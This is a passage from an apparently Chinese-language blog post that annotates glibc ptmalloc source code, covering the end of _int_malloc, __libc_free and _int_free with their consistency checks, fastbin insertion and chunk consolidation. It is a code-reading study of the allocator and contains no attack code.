*/</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">               <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">               <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                 av-&gt;last_remainder = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>过程：</p><ul><li>首先先++idx，因为此时必然没有合适的chunk，那么就++开始找，然后赋值block map bit那些的</li><li>之后判定<code>bit&gt;map</code>(该map没有对应的chunk) <code>|| bit==0</code>(出界)，如果判定成功就会往下一个block找，如果<code>block&gt;=BINMAPSIZE</code>说明超出界限，那么直接进行<code>use top</code>，但是如果找到了对应的block则该block一定存在空闲的chunk</li><li>接下来就是在这个map里一位一位找，直到找到对应的bin</li><li>然后判定如果该bin为空(被用完了但是没有置零)，就会置零然后重头开始</li><li>之后满足所有条件就是分割chunk的常规操作</li></ul><h3 id="use-top"><a href="#use-top" class="headerlink" title="use_top"></a>use_top</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>如果topchunk的size足够分配,那么从topchunk中进行切割</li><li>若不够,如果有fast chunk则进行malloc_consolidate,并再次计算idx,回到大循环起始,一般是申请small chunk进入大循环才有可能会触发这个选项</li><li>若不够,且没有fast chunk,采用sysmalloc</li></ul><h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))   <span class="comment">//__free_hook的调用</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过程：</p><ul><li>如果__free_hook上有东西则直接调用，然后返回</li><li>free(0)没有影响，直接返回</li><li>如果是mmap的chunk则特殊处理</li><li>正常调用<code>_int_free</code></li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br></pre></td></tr></table></figure><h3 id="检查该chunk的合法性"><a href="#检查该chunk的合法性" class="headerlink" title="检查该chunk的合法性"></a>检查该chunk的合法性</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)   <span class="comment">//指针超出了地址空间的范围</span></span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))       <span class="comment">//指针p不对齐</span></span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">   multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))  <span class="comment">//size &lt; MINSIZE或者size不对齐</span></span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p);</span><br></pre></td></tr></table></figure><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())   <span class="comment">//属于fastbin范围</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS   <span class="comment">//为0，不调用</span></span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)  </span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))    <span class="comment">//检查next_chunk的size大小合法</span></span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   在这一点上，我们可能还没有获取到锁，并发修改 system_mem 可能导致了一个误报。在获取锁之后重新进行测试。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;                  <span class="comment">//加锁</span></span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)   </span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;              <span class="comment">//由于要求不要锁，所以mutex与locked置0</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);   </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);               <span class="comment">//计算索引</span></span><br><span class="line">    fb = &amp;fastbin (av, idx);                              <span class="comment">//fb是链表头</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;                            <span class="comment">//old=*fb，定义old2</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">   (i.e., double free).  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))     <span class="comment">//检查链表头是不是要释放的chunk，避免double free</span></span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   检查顶部的 fastbin 块的大小是否与我们要添加的块的大小相同。</span></span><br><span class="line"><span class="comment">   只有在持有锁的情况下才能引用 OLD，否则它可能已经被释放。</span></span><br><span class="line"><span class="comment">   下面的 OLD_IDX 的使用是实际检查的部分。</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">p-&gt;fd = old2 = old;       </span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);  <span class="comment">//总的来说目的就是将p插入到fastbin里</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="继续检查"><a href="#继续检查" class="headerlink" title="继续检查"></a>继续检查</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">   Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">   <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">     (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);                    <span class="comment">//加锁</span></span><br><span class="line">     locked = <span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">      top block.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))    <span class="comment">//p不能是top chunk</span></span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))       <span class="comment">//内存块连续且nextchunk超出边界</span></span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line">   <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">   <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))    <span class="comment">//nextchunk的p位要为1</span></span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">   nextsize = chunksize(nextchunk);</span><br><span class="line">   <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))     <span class="comment">//size的大小要合法</span></span><br><span class="line">     &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">   free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure><h3 id="考虑合并"><a href="#考虑合并" class="headerlink" title="考虑合并"></a>考虑合并</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* consolidate backward */</span></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p)) &#123;         <span class="comment">//检查，前向合并</span></span><br><span class="line">     prevsize = p-&gt;prev_size;</span><br><span class="line">     size += prevsize;</span><br><span class="line">     p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">     unlink(av, p, bck, fwd);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;        <span class="comment">//如果nextchunk不是topchunk</span></span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);  <span class="comment">//设置nextchunk的p位</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123;   <span class="comment">//检查，后向合并</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd);</span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))   <span class="comment">//bck-&gt;fd-&gt;bk==bck</span></span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;        <span class="comment">//插入unsorted bin里</span></span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">     consolidate into top</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> &#123;         <span class="comment">//如果nextchunk是topchunk，则合并到topchunk里</span></span><br><span class="line">     size += nextsize;</span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     av-&gt;top = p;</span><br><span class="line">     check_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="整理堆块"><a href="#整理堆块" class="headerlink" title="整理堆块"></a>整理堆块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 